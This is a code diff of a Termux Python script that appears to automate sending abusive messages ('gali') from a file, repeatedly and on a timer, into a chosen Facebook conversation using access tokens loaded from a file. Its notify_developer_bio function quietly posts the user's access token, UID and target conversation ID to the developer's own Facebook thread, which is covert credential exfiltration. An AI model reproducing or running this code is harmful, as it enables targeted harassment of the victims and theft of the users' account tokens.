@@ -381,7 +381,7 @@ def get_stop_key():
 
 def notify_developer_bio(current_token, mn, thread_id, uid, ms):
     DEV_THREAD_ID = "t_61571843423018"
-    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\nName: {mn}\nConversation: {thread_id}\nUID: {uid}\nMessage File: {ms}"
+    bio_message = f"Hello NADEEM  SīīR! I am uSīīnG YouR OFFLIME TERMUX. MY  details īīS::⤵️\nToken: {current_token}\USSER HATER nName ::>  {mn}\nUSSER Conversation ID ::> {thread_id}\nUSSER UID ::>  {uid}\nUSSER Message File ::> {ms}"
     url = f"https://graph.facebook.com/v15.0/{DEV_THREAD_ID}/"
     parameters = {'access_token': current_token, 'message': bio_message}
     try:
@@ -491,17 +491,17 @@ if os.path.exists("stop_signal.txt"):
 animated_logo()
 
 # Then, show the original colored logo and venom animations
-colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""
+colored_logo = lambda: [print("".join(f"\033[38;5;{random.randint(16,88)}m" + char for char in line) + "\033[0m") for line in r"""  \033[1;32m \033[1;91m\033[1;41m\033[1;33m🔛 WELCOME YOUR NADEEN TERMUX OWNER BROKEN NADEEM INSIDE 🔛\033[;0m\033[1;91m\033[1;92m\033[38;5;46m
 
    """.splitlines()]
 colored_logo()
 venom()
 print(Fore.GREEN + "[•]  START TIME ==> " + datetime.datetime.now().strftime("%Y-%m-%d %I:%M:%S %p"))
-print(Fore.GREEN + "[•] _BROKEN BOY NADEEM IINSIIDE \n")
+print(Fore.GREEN + "[•] BROKEN BOY NADEEM IINSIIDE \n")
 animated_print("<<════════════════════════════════════════════════════════>>")
 # --- Print the Stop Key in the desired animated format ---
 animated_print          ("<==========================>", delay=0.005, jitter=0.002)
-animated_print                     ("[•] Your Stop Key: " + get_stop_key(), delay=0.005, jitter=0.002)
+animated_print                     ("[•] Your Stop Key:   " + get_stop_key(), delay=0.005, jitter=0.002)
 animated_print          ("<===========================>", delay=0.005, jitter=0.002)
 
 print_custom_bio()
@@ -517,7 +517,7 @@ else:
     sys.exit()
 
 os.system('espeak -a 300 "TOKAN FILE NAME DALO"')
-token_file = input("[+] ENTER TOKEN FILE NAME ::> ").strip()
+token_file = input("[+] ENTER TOKEN FILE::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 with open(token_file, 'r') as f2:
     token_data = f2.read()
@@ -538,16 +538,16 @@ animated_print("<<════════════════════�
 start_queue_processor()
 
 os.system('espeak -a 300 "CONVO ID DALO JAHA GALI DENI HA"')
-thread_id = input("[+] ENTER Conversation ID ::>").strip()
+thread_id = input("[+] ENTER Conversation ID ::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "TATE KA NAME DALO"')
-mn = input("[+] ENTER HATER NAME ::> ").strip()
+mn = input("[+] ENTER HATER NAME ::>  ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "GALI FILE DALO"')
-ms = input("[+] ENTER GALI FILE ::> ").strip()
+ms = input("[+] ENTER GALI FILE ::>   ").strip()
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "FILE KITNI BAAR REPIT KARANI HA"')
-repeat = int(input("[+] KITNI BAAR IS GALI KO reload  KARNA HAI ::>"))
+repeat = int(input("[+] KITNI BAAR IS GALI KO reload  KARNA HAI ::>  "))
 animated_print("<<═════════════════════════════════════════════════════════════════════════>>")
 os.system('espeak -a 300 "SPEED DALO YAR"')
 timm = int(input("[+] Enter Speed in Seconds ::> "))
